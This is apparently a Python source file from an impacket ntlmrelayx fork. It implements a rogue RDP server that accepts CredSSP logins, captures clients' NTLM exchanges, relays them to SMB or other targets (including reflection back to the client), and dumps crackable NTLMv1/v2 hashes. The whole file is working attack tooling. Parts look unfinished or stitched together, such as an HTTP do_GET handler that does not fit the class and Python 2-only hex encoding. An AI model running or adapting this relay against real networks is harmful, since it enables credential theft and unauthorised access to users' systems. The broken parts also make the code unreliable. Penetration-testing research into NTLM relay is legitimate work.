# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# RDP Relay Server
#
# Authors:
#  Romain Carnus (gosecure)
#
# Description:
#             This is the RDP server which relays the NTLMSSP messages when of CredSSP to other protocols

import socketserver
import socket
import base64
import random
import struct
import string
import threading
from threading import Thread
from six import PY2

from impacket import ntlm, LOG
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS

from impacket.rdp import *
import impacket.ntlm
import impacket.spnego
from impacket.spnego import SPNEGO_NegTokenResp, TypesMech
from OpenSSL import SSL
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor

class RDPRelayServer(Thread):
    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.server = None

    def run(self):
        LOG.info("Setting up RDP Server")

        if self.config.listeningPort:
            rdpport = self.config.listeningPort
        else:
            rdpport = 3389
            #If a proxy service is started (ie. bettercap) should be listening on a different port

        # changed to read from the interfaceIP set in the configuration
        self.server = RDPServer((self.config.interfaceIp, rdpport), RDPRelayHandler, self.config)
        #self.server = RDPServer((self.config.interfaceIp, rdpport), RDPHandler, self.config)

        try:
             self.server.serve_forever()
        except KeyboardInterrupt:
             pass
        LOG.info('Shutting down RDP Server')
        self.server.server_close()

class RDPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    def __init__(self, server_address, RequestHandlerClass, config):
        self.config = config
        self.daemon_threads = True
        if self.config.ipv6:
            self.address_family = socket.AF_INET6
        #TODO initialise dynamically server globals here:
        self.serverName = 'testServer'
        self.domainName = 'testDomain'
        self.__activeConnections = {}
        socketserver.TCPServer.__init__(self,server_address, RequestHandlerClass)

    def addConnection(self, name, ip, port):
        self.__activeConnections[name] = {}
        print("Current Connections", self.__activeConnections.keys())
        self.__activeConnections[name]['PacketNum']       = 0
        self.__activeConnections[name]['ClientIP']        = ip
        self.__activeConnections[name]['ClientPort']      = port
        self.__activeConnections[name]['Uid']             = 0
        self.__activeConnections[name]['ConnectedShares'] = {}
        self.__activeConnections[name]['OpenedFiles']     = {}
        #TODO: clean up what is not useful here
        # SID results for findfirst2
        self.__activeConnections[name]['SIDs']            = {}
        self.__activeConnections[name]['LastRequest']     = {}
        self.__activeConnections[name]['SignatureEnabled']= False
        self.__activeConnections[name]['SigningChallengeResponse']= ''
        self.__activeConnections[name]['SigningSessionKey']= b''
        self.__activeConnections[name]['Authenticated']= False

    def removeConnection(self, name):
        try:
           del(self.__activeConnections[name])
        except:
           pass
        LOG.info("Remaining connections %s" % list(self.__activeConnections.keys()))

    def getActiveConnections(self):
        return self.__activeConnections

    def setConnectionData(self, connId, data):
        self.__activeConnections[connId] = data
        #print "setConnectionData" 
        #print self.__activeConnections

    def getConnectionData(self, connId, checkStatus = True):
        conn = self.__activeConnections[connId]
        if checkStatus is True:
            if ('Authenticated' in conn) is not True:
                # Can't keep going further
                raise Exception("User not Authenticated!")
        return conn

class RDPHandler(socketserver.BaseRequestHandler):
    def __init__(self, request, client_address, server):
        self.ip, self.port = client_address[:2]
        self.connId = threading.currentThread().getName()
        self.RDPServer = server
        self.socket = request
        self.challengeMessage = None
        self.target = None
        self.client = None
        self.machineAccount = None
        self.machineHashes = None
        self.domainIp = None
        self.authUser = None
        try:
            socketserver.BaseRequestHandler.__init__(self, request, client_address, server)
        except Exception as e:
            LOG.debug("Exception:", exc_info=True)
            LOG.error(str(e))

    def negociateRDP(self,pktdata):
        #Only supported mode: CredSSP for now
        try:
            tpkt = TPKT(pktdata)
            tpdu = TPDU(tpkt['TPDU'])
            rdp_neg_req = RDP_NEG_REQ(tpdu['VariablePart'])
        except:
            LOG.info("Received malformed RDP packet or unable to parse it")
            return None

        if ( rdp_neg_req['requestedProtocols'] | (PROTOCOL_HYBRID & PROTOCOL_SSL) != 0):
            LOG.info("Client requested CredSSP protocol")
        elif ( rdp_neg_req['requestedProtocols'] | (PROTOCOL_SSL) != 0 ):
            LOG.info("Client requested SSL protocol")
        else:
            LOG.info("Client asked for something else ...")
            raise Exception('Unsupported requested protocol')


        response = TPKT()
        tpdu = TPDU()
        rdp_neg_resp = RDP_NEG_RSP()
        #DO NOT respond with HYBRID_EX:
        rdp_neg_resp['selectedProtocols'] = PROTOCOL_HYBRID
        LOG.info("Responding with CredSSP")
        tpdu['VariablePart'] = rdp_neg_resp.getData()
        tpdu['Code'] = TPDU_CONNECTION_CONFIRM
        response['TPDU'] = tpdu.getData()
        #Does not seem to be necessary:
        #self['SRC-REF'] = 0x3412
        #Flags do not matter much:
        #self['Flags'] = ( EXTENDED_CLIENT_DATA_SUPPORTED | DYNVC_GFX_PROTOCOL_SUPPORTED | NEGRSP_FLAG_RESERVED | RESTRICTED_ADMIN_MODE_SUPPORTED | REDIRECTED_AUTHENTICATION_MODE_SUPPORTED )
        return response

    def handle(self):
        LOG.info("New incoming connection (%s,%d)" % (self.ip, self.port))
        self.RDPServer.addConnection(self.connId, self.ip, self.port)

        #0.handle the RDP_NEG_REQ request (to be removed later)
        buff = self.socket.recv(8192)
        resp = self.negociateRDP(buff)

        if resp is None:
            self.finish()
            return

        self.socket.sendall(resp.getData())

        """
        if rdp_neg_resp['selectedProtocols'] == PROTOCOL_HYBRID:
            #Ok, now switching onto credSSP:
            self.credssphandle()
        else:
            LOG.error("Unsupported protocol")
            raise()
        """
        #TODO: verify if we responded with Credssp
        #Switching now to credssp
        self.credssphandle()

        return

    def obtainNTLMChallenge(self,type1):
        """
        Takes a NTLMAuthNegotiate as input
        Build and returns a NTLMAuthChallenge structure
        """
        #Reuse of the code sample in smbserver.py:2733
        # Generate the AV_PAIRS
        av_pairs = ntlm.AV_PAIRS()
        serverName = self.RDPServer.serverName
        domainName = self.RDPServer.domainName
        
        ansFlags = 0

        if type1['flags'] & ntlm.NTLMSSP_NEGOTIATE_56:
            ansFlags |= ntlm.NTLMSSP_NEGOTIATE_56
        if type1['flags'] & ntlm.NTLMSSP_NEGOTIATE_128:
            ansFlags |= ntlm.NTLMSSP_NEGOTIATE_128
        if type1['flags'] & ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH:
            ansFlags |= ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH
        if type1['flags'] & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
            ansFlags |= ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
        if type1['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
            ansFlags |= ntlm.NTLMSSP_NEGOTIATE_UNICODE
        if type1['flags'] & ntlm.NTLM_NEGOTIATE_OEM:
            ansFlags |= ntlm.NTLM_NEGOTIATE_OEM

        ansFlags |= ntlm.NTLMSSP_NEGOTIATE_VERSION | ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO | ntlm.NTLMSSP_TARGET_TYPE_SERVER | ntlm.NTLMSSP_NEGOTIATE_NTLM | ntlm.NTLMSSP_REQUEST_TARGET

        import calendar
        import time
        av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] = av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = serverName.encode('utf-16le')
        av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] = av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = domainName.encode('utf-16le')
        av_pairs[ntlm.NTLMSSP_AV_TIME] = struct.pack('<q', (116444736000000000 + calendar.timegm(time.gmtime()) * 10000000) )

        challengeMessage = ntlm.NTLMAuthChallenge()
        challengeMessage['flags']            = ansFlags
        challengeMessage['domain_len']       = len(serverName.encode('utf-16le'))
        challengeMessage['domain_max_len']   = challengeMessage['domain_len']
        challengeMessage['domain_offset']    = 40 + 16
        challengeMessage['challenge']        = b'A'*8
        challengeMessage['domain_name']      = domainName.encode('utf-16le')
        challengeMessage['TargetInfoFields_len']     = len(av_pairs)
        challengeMessage['TargetInfoFields_max_len'] = len(av_pairs)
        challengeMessage['TargetInfoFields'] = av_pairs
        challengeMessage['TargetInfoFields_offset']  = 40 + 16 + len(challengeMessage['domain_name'])
        challengeMessage['Version']          = b'\xff'*8 
        # in mstsc the following version string was found : "\n\x00cE\x00\x00\x00\x0f"
        challengeMessage['VersionLen']       = 8

        return challengeMessage

    def credssphandle(self):
        import ssl
        #1.Start the TLS Server
        LOG.info("Switching to a TLS context")
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        #openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
        #TODO: try to do that as soon as possible
        context.load_cert_chain(certfile="/root/forked-impacket/keys/certificate.pem", keyfile="/root/forked-impacket/keys/key.pem")
        tls = context.wrap_socket(self.socket,server_side=True)

        #With pyopenssl this is painful
        #ctx = SSL.Context(SSL.TLSv1_2_METHOD)
        #ctx.set_cipher_list("TLSv1.2")
        #tls = SSL.Connection(ctx,self.__socket)
        #wait for connections:
        #tls.set_accept_state()
        #tls.accept()

        buff = tls.recv(4096)
        #print str(buff).encode('hex')

        #2.Parse the packet as a TSRequest
        tsreq = TSRequest()
        tsreq.fromString(buff)
        #get the NegoData field of the TSRequest
        token = tsreq['NegoData']

        """
        if type1['message_type'] != "1":
            LOG.info("Received something else than an authentication request: Message type: %d", type1['message_type'])

        #the type of the token is determined in obtainChallenge
        if type1[''] == "NTLMSSP\x00":
            LOG.info("NTLMSSP found")
            #TODO try to decode this:
            #type1['os_version'][0]  - Major
            #type1['os_version'][1]  - Minor
            #type1['os_version'][2:3]  - Build number
            #type1['os_version'][6]  - NTLM version
            LOG.info("OS-version advertised: %s" % (type1['os_version'].decode('utf-16le')))
            if type1['domain_name'] != "" or type1['host_name'] != "":
                LOG.info("Client info: %s\\%s" % (type1['domain_name'].decode('utf-16le'),type1['host_name'].decode('utf-16le')))
        #else if type1[''] == "KRB5\x00" :
        #    print "KRB5 found"
        else:
            LOG.error("Unknown SSP requested")
            self.finish()
            raise Exception('Unknown SSP requested')
        """
   
        #3.if NTLMSSP, relay to targets
        challengeMessage = self.obtainNTLMChallenge(token)

        """
        type2 = ntlm.NTLMAuthChallenge(domain="local",challenge=b'A'*8)
        type2['Version'] = "\n\x00cE\x00\x00\x00\x0f"
        type2['TargetInfoFields'] = "\n\x00cE\x00\x00\x00\x0f"
        """
        #type2 = NTLMAuthChallenge("NTLMSSP\x00\x02\x00\x00\x00\x1e\x00\x1e\x008\x00\x00\x005\x82\x8a\xe2\xbc\x8f\xa6\xcf\xa8a\x98\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x98\x00\x98\x00V\x00\x00\x00\n\x00cE\x00\x00\x00\x0fD\x00E\x00S\x00K\x00T\x00O\x00P\x00-\x002\x00E\x00A\x00S\x00E\x00I\x00K\x00\x02\x00\x1e\x00D\x00E\x00S\x00K\x00T\x00O\x00P\x00-\x002\x00E\x00A\x00S\x00E\x00I\x00K\x00\x01\x00\x1e\x00D\x00E\x00S\x00K\x00T\x00O\x00P\x00-\x002\x00E\x00A\x00S\x00E\x00I\x00K\x00\x04\x00\x1e\x00D\x00E\x00S\x00K\x00T\x00O\x00P\x00-\x002\x00E\x00A\x00S\x00E\x00I\x00K\x00\x03\x00\x1e\x00D\x00E\x00S\x00K\x00T\x00O\x00P\x00-\x002\x00E\x00A\x00S\x00E\x00I\x00K\x00\x07\x00\x08\x00\xf2\x8c\xc7\xb5&\xf6\xd4\x01\x00\x00\x00\x00")
        try:
            tsreq = TSRequest()
            tsreq['NegoData'] = challengeMessage.getData()
            tsreq['Version'] = 6
            buff = tsreq.getData()
        except:
            LOG.error("Unable to build tsRequest from type2 message")
            self.finish()
            raise

        tls.sendall(buff)

        #This should be the type3 here:
        buff = tls.recv(4096)
        LOG.info("Received what seems to be the type3 from the client")
        #print(buff.encode('hex'))
        try:
            tsreq.fromString(buff)
            type3 = ntlm.NTLMAuthChallengeResponse()
            type3.fromString(tsreq['NegoData'])
        except:
            LOG.error("Unable to parse packet as tsRequest")
            self.finish()
            raise

        #print(type3.getData().encode('hex'))
        #print(challengeMessage.getData().encode('hex'))
        #TODO: maybe remove client and modules parameters of this method (or get it from connData['ClientIP'])
        decodedType3 = ParseHTTPHash(type3.getData(), challengeMessage['challenge'], "client", "RDPModule")

        LOG.info(decodedType3['fullhash'])

        #If we are in a relay server let's continue the fun
        self.relay(type3,challengeMessage)

        return

    def finish(self):
        # Thread/process is dying, we should tell the main thread to remove all this thread data
        LOG.info("Closing down connection (%s,%d)" % (self.ip, self.port))
        self.RDPServer.removeConnection(self.connId)
        return socketserver.BaseRequestHandler.finish(self)

    def relay(self,type3=None,challengeMessage=None):
        """
        For a regular simple server, for now do nothing. Close the connection
        """
        self.finish()


class RDPRelayHandler(RDPHandler):
    
    def obtainNTLMChallenge(self,token):
        """
        Obtain a NTLM challenge from a target
        takes a NTLMAuthNegotiate structure as input

        returns a NTLMAuthChallenge structure
        """
        #Inspired by code in SmbNegotiate (smbrelayserver:110)
        connData = self.RDPServer.getConnectionData(self.connId, checkStatus=False)

        if self.RDPServer.config.mode.upper() == 'REFLECTION':
            self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])
        #Obtain a target from config
        elif self.RDPServer.config.target is not None:
            self.targetprocessor = self.RDPServer.config.target
        else:
            raise Exception("Not in reflective mode nor is any target configured")
        
        self.target = self.targetprocessor.getTarget()

        LOG.info("RDPD-%s: Received connection from %s, attacking target %s://%s" % (self.connId, connData['ClientIP'], self.target.scheme,
                                                                                  self.target.netloc))
        try:
            if self.RDPServer.config.mode.upper() == 'REFLECTION':
                # Force standard security when doing reflection
                LOG.debug("Downgrading to standard security")
                extSec = False
                #recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
            else:
                extSec = True
            # Init the correct client for our target
            #TODO tweak the timeout
            client = self.init_client(extSec)
        except Exception as e:
            LOG.error("Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
            self.targetprocessor.logTarget(self.target)
        else:
            connData['client'] = client
            connData['EncryptionKey'] = client.getStandardSecurityChallenge()
            self.RDPServer.setConnectionData(self.connId, connData)

        #pass the token to the client
        client = connData['client']
        try:
            #returns a "security blob"
            challengeMessage = self.do_ntlm_negotiate(client, token)
        except Exception:
            #Connection failed
            LOG.error('Negotiating NTLM with %s://%s failed. Skipping to next target',
                        self.target.scheme, self.target.netloc)
            # Log this target as processed for this client
            self.targetprocessor.logTarget(self.target)
            # Raise exception again to pass it on to the SMB server
            raise

        #check if we are in a SPNEGO or in a RawNTLM situation when relaying the first token
        rawNTLM = False
        if struct.unpack('B',token[0:1])[0] == impacket.spnego.ASN1_AID:
            LOG.info("SPENEGO case detected")
        else:
            # No GSSAPI stuff, raw NTLMSSP
            LOG.info("raw NTLMSSP")
            rawNTLM = True


        if rawNTLM is False:
            respToken = SPNEGO_NegTokenResp()
            # accept-incomplete. We want more data
            respToken['NegResult'] = b'\x01'
            respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']

            respToken['ResponseToken'] = challengeMessage.getData()
        else:
            respToken = challengeMessage


        #add the challenge message to the connection data
        connData['CHALLENGE_MESSAGE'] = respToken
        connData['rawNTLM'] = rawNTLM
        self.RDPServer.setConnectionData(self.connId, connData)

        return respToken

    def relay(self,authenticateMessage,challengeMessage):
        """
        Lets relay the type3 (authenticateMessage) to the target
        Then do the attack
        """
        connData = self.RDPServer.getConnectionData(self.connId, checkStatus=False)

        client = connData['client']
        rawNTLM = connData['rawNTLM']

        print(authenticateMessage.getData().encode('hex'))
        
        #Modifications WITHOUT effect:
        """
        authenticateMessage['lanman'] = '\x00'*24
        authenticateMessage['domain_name'] = 'DESKTOP-6BGN7C0'.encode('utf-16le')
        authenticateMessage['domain_len'] = len('DESKTOP-6BGN7C0')*2
        authenticateMessage['host_name'] = 'DESKTOP-6BGN7C0'.encode('utf-16le')
        authenticateMessage['host_len'] = len('DESKTOP-6BGN7C0')*2
        """
        
        


        #Modifications WITH effect:
        #authenticateMessage['session_key'] = "\x00"*16 #causes a parameter_invalid error
        #authenticateMessage['flags'] = authenticateMessage['flags'] | impacket.ntlm.NTLMSSP_NEGOTIATE_VERSION
        
        #authenticateMessage['flags'] = authenticateMessage['flags'] & (0xffffffff - impacket.ntlm.NTLMSSP_NEGOTIATE_VERSION)
        #authenticateMessage['Version'] = '\x00' * 8
        #authenticateMessage['VersionLen'] = 0
        #authenticateMessage['MIC'] = ''
        #authenticateMessage['MICLen'] = 0
        
        """
        authenticateMessage['flags'] = (   #0xe2888235
           impacket.ntlm.NTLMSSP_NEGOTIATE_56      |
           impacket.ntlm.NTLMSSP_NEGOTIATE_128     |
           impacket.ntlm.NTLMSSP_NEGOTIATE_VERSION     |
           impacket.ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO |
           impacket.ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY |
           impacket.ntlm.NTLMSSP_NEGOTIATE_ALWAYS_SIGN |
           impacket.ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH|
           impacket.ntlm.NTLMSSP_NEGOTIATE_NTLM    |
           impacket.ntlm.NTLMSSP_NEGOTIATE_UNICODE     |
           impacket.ntlm.NTLMSSP_NEGOTIATE_SIGN        |
           impacket.ntlm.NTLMSSP_NEGOTIATE_SEAL        |
           impacket.ntlm.NTLMSSP_REQUEST_TARGET |
           0)
        """
        #authenticateMessage['user_name'] = "Rom".encode('utf-16le')
        #authenticateMessage['user_len'] = len('Rom')*2
        #ntlmMessage = authenticateMessage['ntlm']
        #session_key = authenticateMessage['session_key']
        #authenticateMessage.fromString("4e544c4d53535000030000001800180046000000f400f4005e0000000000000040000000060006004000000000000000460000001000100052010000358288e052006f006d00186d79972dce23d6a2d37d7f38a63e4a6d50357243725838187b9c9574d7876b1de567718d66d1580101000000000000941c14e04e37d5016d503572437258380000000001001e004400450053004b0054004f0050002d003200450041005300450049004b0002001e004400450053004b0054004f0050002d003200450041005300450049004b0003001e004400450053004b0054004f0050002d003200450041005300450049004b0004001e004400450053004b0054004f0050002d003200450041005300450049004b0007000800941c14e04e37d5010900280063006900660073002f004400450053004b0054004f0050002d003200450041005300450049004b000000000000000000a96d0870c88e5c5d8353de44bf74445b".decode('hex'))
        #authenticateMessage['ntlm'] = ntlmMessage
        #authenticateMessage['Version'] = '\x0a\x00\x63\x45\x00\x00\x00\x0f'
        #authenticateMessage['VersionLen'] = len('\x0a\x00\x63\x45\x00\x00\x00\x0f')

        #send the type3 to the server
        if authenticateMessage['user_name'] != '':
            self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                        authenticateMessage['user_name'].decode('utf-16le'))).upper()

            #This is optionnal as the client does already the wrapping when necessary
            if rawNTLM is True:
                LOG.info("Raw NTLM case")
                respToken2 = SPNEGO_NegTokenResp()
                respToken2['ResponseToken'] = authenticateMessage.getData()
                #respToken2['NegResult'] = '\x01'
                securityBlob = respToken2.getData()
            else:
                securityBlob = authenticateMessage.getData()

            #respToken2.dump()
            #authenticateMessage.dump()
            #print(securityBlob.encode('hex'))
            #print(challengeMessage['challenge'].encode('hex'))
            securityBlob = authenticateMessage.getData()
            clientResponse, errorCode = self.do_ntlm_auth(client,securityBlob,authenticateMessage)
        else:
            errorCode = STATUS_ACCESS_DENIED

        if errorCode != STATUS_SUCCESS:
            #Log this target as processed for this client
            self.targetprocessor.logTarget(self.target)
            LOG.error("Authenticating against %s://%s as %s\\%s FAILED with errorcode %x" % (
            self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
            authenticateMessage['user_name'].decode('utf-16le'),errorCode))
            if errorCode == 3221225581:
                LOG.error("Invalid credentials")
            if errorCode == 3221225494:
                LOG.error("Valid credentials but something is missing ...")
            client.killConnection()
        else:
            # We have a session, create a thread and do whatever we want
            LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
                self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
                authenticateMessage['user_name'].decode('utf-16le')))
            # Log this target as processed for this client
            self.targetprocessor.logTarget(self.target, True, self.authUser)

            """
            ntlm_hash_data = outputToJohnFormat(connData['CHALLENGE_MESSAGE']['challenge'],
                                                authenticateMessage['user_name'],
                                                authenticateMessage['domain_name'], authenticateMessage['lanman'],
                                                authenticateMessage['ntlm'])
            client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

            if self.server.getJTRdumpPath() != '':
                writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                        self.server.getJTRdumpPath())
            """

        #TODO: do_attack()
        #self.do_attack(client)

        connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
        self.RDPServer.setConnectionData(self.connId, connData)

    
    def init_client(self,extSec):
        """
        Initialize the correct client for the relay target
        """
        if self.target.scheme.upper() in self.RDPServer.config.protocolClients:
            client = self.RDPServer.config.protocolClients[self.target.scheme.upper()](self.RDPServer.config, self.target, extendedSecurity = extSec)
            client.initConnection()
        else:
            raise Exception('Protocol Client for %s not found!' % self.target.scheme)
        return client

    def do_ntlm_negotiate(self,client,token):
        """
        Send the type1 to the target using the client
        takes a NTLMAuthNegotiate message string as input

        Since the clients all support the same operations there is no target protocol specific code needed for now
        """
        return client.sendNegotiate(token)

    """
    def do_ntlm_auth(self,client,token,challenge):
        
        Send the type3 to the target using the client
        takes a NTLMAuthChallengeResponse message string as input along with the challenge

        #The NTLM blob is packed in a SPNEGO packet, extract it for methods other than SMB
        
        clientResponse, errorCode = client.sendAuth(token, challenge)
        return clientResponse, errorCode
    """
    
    def do_ntlm_auth(self,client,token,authenticateMessage):
        #For some attacks it is important to know the authenticated username, so we store it
        if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
            self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                        authenticateMessage['user_name'].decode('utf-16le'))).upper()
        else:
            self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('ascii'),
                                        authenticateMessage['user_name'].decode('ascii'))).upper()
        
        if authenticateMessage['user_name'] != '' or self.target.hostname == '127.0.0.1':
            clientResponse, errorCode = client.sendAuth(token)
        else:
            # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials, except
            # when coming from localhost
            errorCode = STATUS_ACCESS_DENIED
        
        return clientResponse, errorCode
    

    def do_attack(self):
        # Check if SOCKS is enabled and if we support the target scheme
        if self.server.config.runSocks and self.target.scheme.upper() in self.server.config.socksServer.supportedSchemes:
            # Pass all the data to the socksplugins proxy
            activeConnections.put((self.target.hostname, self.client.targetPort, self.target.scheme.upper(),
                                    self.authUser, self.client, self.client.sessionData))
            return

        # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
        if self.target.scheme.upper() in self.server.config.attacks:
            # We have an attack.. go for it
            clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config, self.client.session,
                                                                            self.authUser)
            clientThread.start()
        else:
            LOG.error('No attack configured for %s' % self.target.scheme.upper())

    def do_GET(self):
        messageType = 0
        if self.server.config.mode == 'REDIRECT':
            self.do_SMBREDIRECT()
            return

        LOG.info('HTTPD: Client requested path: %s' % self.path.lower())

        # Serve WPAD if:
        # - The client requests it
        # - A WPAD host was provided in the command line options
        # - The client has not exceeded the wpad_auth_num threshold yet
        if self.path.lower() == '/wpad.dat' and self.server.config.serve_wpad and self.should_serve_wpad(self.client_address[0]):
            LOG.info('HTTPD: Serving PAC file to client %s' % self.client_address[0])
            self.serve_wpad()
            return

        # Determine if the user is connecting to our server directly or attempts to use it as a proxy
        if self.command == 'CONNECT' or (len(self.path) > 4 and self.path[:4].lower() == 'http'):
            proxy = True
        else:
            proxy = False

        if PY2:
            proxyAuthHeader = self.headers.getheader('Proxy-Authorization')
            autorizationHeader = self.headers.getheader('Authorization')
        else:
            proxyAuthHeader = self.headers.get('Proxy-Authorization')
            autorizationHeader = self.headers.get('Authorization')

        if (proxy and proxyAuthHeader is None) or (not proxy and autorizationHeader is None):
            self.do_AUTHHEAD(message = b'NTLM',proxy=proxy)
            pass
        else:
            if proxy:
                typeX = proxyAuthHeader
            else:
                typeX = autorizationHeader
            try:
                _, blob = typeX.split('NTLM')
                token = base64.b64decode(blob.strip())
            except Exception:
                LOG.debug("Exception:", exc_info=True)
                self.do_AUTHHEAD(message = b'NTLM', proxy=proxy)
            else:
                messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

        if messageType == 1:
            if not self.do_ntlm_negotiate(token, proxy=proxy):
                #Connection failed
                LOG.error('Negotiating NTLM with %s://%s failed. Skipping to next target',
                            self.target.scheme, self.target.netloc)
                self.server.config.target.logTarget(self.target)
                self.do_REDIRECT()
        elif messageType == 3:
            authenticateMessage = ntlm.NTLMAuthChallengeResponse()
            authenticateMessage.fromString(token)

            if not self.do_ntlm_auth(token,authenticateMessage):
                if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                    LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
                        self.target.scheme, self.target.netloc,
                        authenticateMessage['domain_name'].decode('utf-16le'),
                        authenticateMessage['user_name'].decode('utf-16le')))
                else:
                    LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
                        self.target.scheme, self.target.netloc,
                        authenticateMessage['domain_name'].decode('ascii'),
                        authenticateMessage['user_name'].decode('ascii')))

                # Only skip to next if the login actually failed, not if it was just anonymous login or a system account
                # which we don't want
                if authenticateMessage['user_name'] != '': # and authenticateMessage['user_name'][-1] != '$':
                    self.server.config.target.logTarget(self.target)
                    # No anonymous login, go to next host and avoid triggering a popup
                    self.do_REDIRECT()
                else:
                    #If it was an anonymous login, send 401
                    self.do_AUTHHEAD(b'NTLM', proxy=proxy)
            else:
                # Relay worked, do whatever we want here...
                if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                    LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
                        authenticateMessage['user_name'].decode('utf-16le')))
                else:
                    LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
                        authenticateMessage['user_name'].decode('ascii')))

                ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                    authenticateMessage['user_name'],
                                                    authenticateMessage['domain_name'],
                                                    authenticateMessage['lanman'], authenticateMessage['ntlm'])
                self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                if self.server.config.outputFile is not None:
                    writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)

                self.server.config.target.logTarget(self.target, True, self.authUser)

                self.do_attack()

                # And answer 404 not found
                self.send_response(404)
                self.send_header('WWW-Authenticate', 'NTLM')
                self.send_header('Content-type', 'text/html')
                self.send_header('Content-Length','0')
                self.send_header('Connection','close')
                self.end_headers()
        return


#Taken from responder
def ParseHTTPHash(data, Challenge, client, module):
    LMhashLen    = struct.unpack('<H',data[12:14])[0]
    LMhashOffset = struct.unpack('<H',data[16:18])[0]
    LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()

    NthashLen    = struct.unpack('<H',data[20:22])[0]
    NthashOffset = struct.unpack('<H',data[24:26])[0]
    NTHash       = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()

    UserLen      = struct.unpack('<H',data[36:38])[0]
    UserOffset   = struct.unpack('<H',data[40:42])[0]
    User         = data[UserOffset:UserOffset+UserLen].replace('\x00','')

    if NthashLen == 24:
        HostNameLen     = struct.unpack('<H',data[46:48])[0]
        HostNameOffset  = struct.unpack('<H',data[48:50])[0]
        HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
        WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, Challenge.encode('hex'))
        DecodedType3 = {
            'module': module, 
            'type': 'NTLMv1', 
            'client': client, 
            'host': HostName, 
            'user': User, 
            'hash': LMHash+":"+NTHash, 
            'fullhash': WriteHash,
        }

    if NthashLen > 24:
        NthashLen      = 64
        DomainLen      = struct.unpack('<H',data[28:30])[0]
        DomainOffset   = struct.unpack('<H',data[32:34])[0]
        Domain         = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
        HostNameLen    = struct.unpack('<H',data[44:46])[0]
        HostNameOffset = struct.unpack('<H',data[48:50])[0]
        HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
        WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, Challenge.encode('hex'), NTHash[:32], NTHash[32:])
                    
        DecodedType3 = {
            'module': module, 
            'type': 'NTLMv2', 
            'client': client, 
            'host': HostName, 
            'user': Domain + '\\' + User,
            'hash': NTHash[:32] + ":" + NTHash[32:],
            'fullhash': WriteHash,
        }

    return DecodedType3